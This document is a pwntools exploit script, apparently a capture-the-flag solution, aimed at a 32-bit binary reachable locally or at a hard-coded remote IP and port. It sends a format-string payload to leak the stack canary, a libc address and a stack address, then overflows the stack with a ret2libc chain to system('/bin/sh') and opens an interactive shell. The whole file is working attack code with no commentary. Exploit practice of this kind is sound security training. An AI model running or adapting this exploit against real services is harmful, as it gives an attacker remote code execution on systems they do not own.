from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8005]
libc=ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='i386', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'i386', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
ru(b'name?\n')
payload = b'%1$p%31$p%39$p'
sl(payload)
str = rl()
print(str)
canary = int(str[-11:-1],16)
leak_addr = int(str[-21:-11],16)
stack_addr = int(str[-31:-21],16) + 0xa4 - 0x10
pr('canary',canary)
pr('leak_addr',leak_addr)
pr('stack_addr',stack_addr)
binsh_addr = leak_addr - 0x6cf5f
libc_base = binsh_addr - 0x1b90f5
sysaddr = libc_base + 0x47cb0
pr('sysaddr',sysaddr)
pr('binshaddr',binsh_addr)
ru(b'\n')
payload2 = b'a' * 0x80 + p32(canary) + p32(stack_addr) + p32(0) + p32(0) + p32(sysaddr) + p32(0) + p32(binsh_addr)
s(payload2)

shell()
